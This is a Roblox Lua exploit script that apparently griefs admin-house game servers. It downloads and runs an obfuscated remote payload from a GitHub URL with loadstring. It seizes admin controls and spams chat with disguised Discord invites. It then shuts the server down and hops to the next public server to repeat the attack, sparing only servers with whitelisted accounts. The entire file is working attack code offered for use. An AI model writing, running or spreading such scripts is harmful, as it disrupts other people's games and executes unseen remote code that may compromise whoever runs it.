wait(0.4)

local Players = game:GetService("Players")
local HTTPService = game:GetService("HttpService")

local whitelisttoggle = true
local whitelisted = {"StvrxqzAlt","Damix2131","DamixNeverDies","AGUSTINLVF1","KohlsHouseNBCFix","KohlsH_Angler","jhone_doee110101","TestAccountKRNL","egglnq","TechnoSniperX","TechnoReaperX","TechncReaperX","egglnqalt","The_NootNootLord","leakproof9853"}

local webLink = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100"
local lol = game.Players.LocalPlayer

function say(msg)
	game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end
wait(0.2)
loadstring(game:HttpGet('https://raw.githubusercontent.com/TheNootNootLord/BRO/main/Obfuscated_2.lua'))()
wait(0.4)


local function serverHop()
    while true do
        local serverList = {}
        for _, v in pairs(HTTPService:JSONDecode(game:HttpGetAsync(webLink)).data) do
            if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
                table.insert(serverList,v.id)
            end
        end

        if #serverList > 0 then
            game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, serverList[math.random(1, #serverList)])
            break
        end
    end
end 

wait(0.1)
if whitelisttoggle == true then
    for i,v in pairs(whitelisted) do
        if game.Players:FindFirstChild(v) then
          say("Your server was spared due to the whitelisted user found: "..v)
          wait(0.2)
          while wait(0.3) do
          task.spawn(serverHop)
          end
        end
    end
end

local root = game.Players.LocalPlayer.Character.HumanoidRootPart
root.Anchored = true
repeat 
wait()
root.CFrame = CFrame.new(-7.165, root.Position.Y+2000 , 94.743)
until workspace.Terrain._Game.Admin:FindFirstChild("Regen")
root.Anchored = false
root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0,3,0)
wait(0.2)

wait(0.1)
print("no whitelisted people found D:")
wait(0.2)
game.Players:Chat(".loopgrab all")
game.Players:Chat(".regen")
wait(0.1)
game.Players:Chat(":music 142912516")
wait(0.4)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \nYour server was destroyed by The Noot Noot Lord')
wait(0.000001)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Join the server if you want the script')
wait(0.000001)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n de s k or d . gg/ kK Eq but way')
wait(0.000001)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n  And join THIS server if you wanna talk to me and stuff')
wait(0.000001)
game.Players:Chat('h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n  desk o rd . gg/ PAT nx vQ 9 Se')
wait(0.3)
game.Players:Chat(".shutdown")

wait(6) -- this is to prevent server hopping instantly


while wait(0.3) do
    task.spawn(serverHop)
end
